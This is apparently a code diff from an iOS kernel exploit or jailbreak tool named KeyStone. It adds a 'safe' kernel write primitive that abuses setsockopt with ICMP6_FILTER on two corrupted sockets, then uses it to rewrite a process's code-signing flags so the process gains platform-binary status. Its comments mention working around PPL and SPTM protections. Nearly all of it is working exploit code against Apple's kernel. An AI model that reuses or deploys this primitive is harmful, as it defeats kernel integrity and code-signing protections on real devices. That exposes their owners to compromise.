@@ -9,6 +9,42 @@
 
 #include <mach/mach.h>
 #include <CommonCrypto/CommonDigest.h>
+#include <sys/socket.h>
+#include <netinet/icmp6.h>
+
+// ---------------------------------------------------------------------------
+// Safe write: directly uses setsockopt like early_kwrite32bytes but does NOT
+// crash on failure.  Returns true if the write succeeded, false otherwise.
+// ---------------------------------------------------------------------------
+extern int controlSocket, rwSocket;
+extern uint8_t controlData[];
+static bool safe_setsockopt_write64(uint64_t where, uint64_t what)
+{
+    if (controlSocket < 0 || rwSocket < 0) return false;
+
+    memset(controlData, 0, EARLY_KRW_LENGTH);
+    *(uint64_t *)controlData = where;
+    if (setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH) != 0)
+        return false;
+
+    uint8_t writeBuf[EARLY_KRW_LENGTH];
+    memset(writeBuf, 0, sizeof(writeBuf));
+    *(uint64_t *)writeBuf = what;
+    if (setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH) != 0)
+        return false;
+
+    return true;
+}
+
+static bool safe_kwrite32(uint64_t where, uint32_t what)
+{
+    uint64_t aligned = where & ~0x7ULL;
+    int shift = (int)(where & 0x7ULL) * 8;
+    uint64_t old = kread64(aligned);
+    uint64_t mask = 0xFFFFFFFFULL << shift;
+    uint64_t new_val = (old & ~mask) | ((uint64_t)what << shift);
+    return safe_setsockopt_write64(aligned, new_val);
+}
 
 // ---------------------------------------------------------------------------
 // Thread-based PAC key manipulation (non-PPL, works via kwrite64)
@@ -68,13 +104,14 @@ bool kpac_platformize_self(void)
                 printf("[KeyStone] csflags = 0x%08x\n", cs);
                 uint32_t desired = cs | CS_VALID | CS_PLATFORM_BINARY;
                 if (cs != desired) {
-                    kwrite32(csflags_addr, desired);
-                    uint32_t v = kread32(csflags_addr);
-                    if (v == desired) {
-                        printf("[KeyStone] csflags patched via kwrite32!\n");
-                        return true;
+                    if (safe_kwrite32(csflags_addr, desired)) {
+                        uint32_t v = kread32(csflags_addr);
+                        if (v == desired) {
+                            printf("[KeyStone] csflags patched via safe_kwrite32!\n");
+                            return true;
+                        }
                     }
-                    printf("[KeyStone] kwrite32 csflags failed (PPL)\n");
+                    printf("[KeyStone] safe kwrite32 csflags failed (PPL)\n");
                 } else {
                     printf("[KeyStone] csflags already correct\n");
                     return true;
@@ -229,12 +266,14 @@ bool kpac_write_csflags(uint64_t proc, uint32_t csflags)
 
     if (current == csflags) return true;
 
-    // Try virtual kwrite32 first
-    kwrite32(target_va, csflags);
-    if (kread32(target_va) == csflags) {
-        printf("[KeyStone] csflags patched via virtual write\n");
-        return true;
+    // Try virtual kwrite32 first (safe, won't crash on PPL/SPTM)
+    if (safe_kwrite32(target_va, csflags)) {
+        if (kread32(target_va) == csflags) {
+            printf("[KeyStone] csflags patched via safe virtual write\n");
+            return true;
+        }
     }
+    printf("[KeyStone] csflags virtual write failed (PPL/SPTM)\n");
 
     // Physical write attempt
     uint64_t pa = kpac_virt_to_phys(target_va);
